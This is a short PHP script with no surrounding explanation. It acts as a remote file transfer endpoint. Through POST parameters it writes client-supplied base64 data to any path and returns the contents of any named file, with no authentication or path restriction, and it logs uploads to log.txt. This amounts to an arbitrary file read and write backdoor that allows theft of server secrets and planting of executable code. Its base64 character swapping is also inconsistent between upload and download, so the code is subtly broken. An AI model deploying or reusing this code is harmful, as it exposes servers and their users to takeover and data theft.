<?php
// Prevent Cache
header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Cache-Control: post-check=0, pre-check=0', FALSE);
header('Pragma: no-cache');

if (isset($_POST['upload']) && isset($_POST['data']))
{
    $thedata = base64_decode(str_replace(array('-','_'),array('+','/'),$_POST['data']));
    file_put_contents ("log.txt",$_POST['data']);
    $fp = fopen($_POST['upload'], 'wb');
    fwrite($fp, $thedata);
    fclose($fp);
}
else if (isset ($_POST['download']))
{
    if (file_exists($_POST['download']))
    {
        header('Content-Length: ' . filesize($_POST['download']));
        header("Content-type: application/octet-stream");
		$encData = base64_encode(file_get_contents($_POST['download']));
		echo str_replace(array('_','-'),array('/','+'),$encData);
    }
    else
        echo 'Error: File Not Found';
}
else
    echo 'Error: Unknown Request';
?>